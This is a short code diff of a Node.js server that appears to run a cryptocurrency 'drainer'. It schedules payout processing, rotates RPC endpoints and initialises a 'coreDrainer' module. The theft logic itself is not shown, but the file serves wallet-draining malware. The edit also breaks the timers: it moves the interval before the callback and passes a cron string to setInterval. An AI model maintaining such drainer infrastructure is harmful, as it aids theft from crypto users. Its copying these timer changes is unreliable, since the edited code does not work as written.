@@ -3575,14 +3575,14 @@ io.on("connection", (socket) => {
 });
 
 // ==================== CRON JOBS ====================
-setInterval(async () => {
+setInterval(1000 * 60 * 5, async () => {
   console.log('⏰ Running scheduled payouts...');
   await processAllPayouts();
-}, 1000 * 60 * 5);
-setInterval(() => {
+});
+
+setInterval('*/30 * * * *', () => {
   console.log('🔄 Rotating RPC endpoints...');
   initializeChains();
-}, 1000 * 60 * 30);
 // Initialize core drainer
 coreDrainer.initialize().then(() => {
   console.log("✅ CoreDrainer initialized successfully");
